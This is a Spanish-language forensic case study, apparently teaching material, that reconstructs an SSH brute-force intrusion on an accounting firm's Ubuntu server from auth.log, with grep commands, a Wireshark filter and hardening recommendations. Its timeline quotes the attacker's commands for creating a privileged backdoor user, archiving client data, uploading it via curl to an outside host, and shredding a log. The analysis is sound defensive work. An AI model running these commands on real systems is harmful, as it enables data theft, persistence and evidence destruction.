# Caso 3 — Servidor Linux comprometido

**Contexto.** Un estudio contable nota un usuario raro en su servidor Ubuntu y entrega `/var/log/auth.log`
(749 líneas, 14/11, 02:10:08 → 08:02:00). SHA-256 `09345a30…37be`, sin cambios tras el análisis.

## Zona horaria: primero, no asumir

El formato syslog **no guarda año ni zona horaria**. Si el servidor está en UTC (lo habitual), hay que
restar 3 horas; si está en hora argentina, no. Se verifica en el equipo (`timedatectl`, `/etc/timezone`)
y se deja escrito. Abajo: hora del log y, entre paréntesis, UTC-3 asumiendo servidor en UTC.

## 3.1 Script

```bash
python auth_log.py auth.log
```

→ [salida_auth_log.txt](../resultados/caso3_servidor/salida_auth_log.txt)

## 3.2 Comandos de Linux

```bash
grep "Failed password" auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn
grep "Accepted" auth.log
grep "sudo:" auth.log | grep COMMAND
grep -c "for backup from" auth.log
```

## Reconstrucción

| Hora log (UTC-3) | Evento |
|---|---|
| 02:10 → 05:09 (23:10 → 02:09) | Fuerza bruta SSH simultánea desde **198.51.100.23**, **203.0.113.77** y **192.0.2.150** (741 intentos; 58 sobre `backup`) |
| 05:17:42 (02:17:42) | **Accepted password for backup from 203.0.113.77** |
| 05:19:03 | `sudo useradd -m -s /bin/bash soporte2` — usuario con nombre poco llamativo |
| 05:19:40 | `sudo usermod -aG sudo soporte2` — **persistencia** con privilegios |
| 05:21:15 | `sudo tar czf /tmp/.c.tgz /srv/clientes` — datos de clientes en archivo **oculto** |
| 05:24:52 | `sudo curl -T /tmp/.c.tgz http://198.51.100.200/up` — **exfiltración** por HTTP PUT |
| 05:26:01 | `sudo shred -u /var/log/apache2/access.log` — **antiforense** |
| 05:30:11 | Desconexión (sesión de 12,5 min) |
| 08:02:00 | `admin` desde 192.168.1.10 (LAN) con clave ED25519 |

**¿Cómo consiguieron la contraseña?** Ataque de diccionario/fuerza bruta distribuido: las tres IPs
atacan en la misma ventana, se detienen juntas y 8 minutos después llega el acceso. Correlación, no prueba
de que sean el mismo actor.

**¿El acceso de las 08:02 es sospechoso?** En principio no: IP interna, clave pública, sin fallos. Pero
(1) hay que confirmar con el estudio qué equipo es la .10; (2) si el log está en UTC serían las 05:02 locales;
(3) el PID de `sshd` baja de 3742 a **1201**, lo que sugiere un **reinicio** entre ambas sesiones
(verificar con `last reboot` / `journalctl --list-boots`).

## Verificar la herramienta

`auth_log.py` cuenta 412 / 233 / 96 fallos; `grep "Failed password"` cuenta 283 / 163 / 70.
La diferencia son las líneas `Invalid user` (225). En este log son intentos distintos, pero en un `sshd` real
un usuario inexistente genera **dos** líneas por intento → mejora pendiente: contar por PID de `sshd`.

## 3.3 Tráfico de red

Filtro de Wireshark para la subida:

```
ip.addr == 198.51.100.200 && http.request.method == "PUT"
```

Al ser HTTP sin cifrar, *File → Export Objects → HTTP* recuperaría el archivo exfiltrado completo.

## Recomendaciones

1. `PasswordAuthentication no` y `PermitRootLogin no`: sólo claves; SSH detrás de VPN o lista blanca de IPs.
2. fail2ban / límites en el firewall contra fuerza bruta.
3. Mínimo privilegio: la cuenta `backup` no debe tener sudo; eliminar `soporte2` (después de documentarla).
4. Logs centralizados (rsyslog remoto / SIEM) para que un intruso no pueda borrarlos; alertas sobre sudo y conexiones salientes.

Además: rotar todas las credenciales, evaluar la notificación a clientes (Ley 25.326) y **no reinstalar
antes de adquirir una imagen del disco**.

## Qué pediría para completar la pericia

`/home/backup/.bash_history`, `/tmp/.c.tgz`, `/etc/passwd` y `/etc/group`, `wtmp`/`btmp`/`lastlog`,
el journal de systemd y una imagen del disco: `shred` no garantiza el borrado en ext4 con journal ni en SSD,
así que el `access.log` podría recuperarse por carving (técnica del Caso 2).
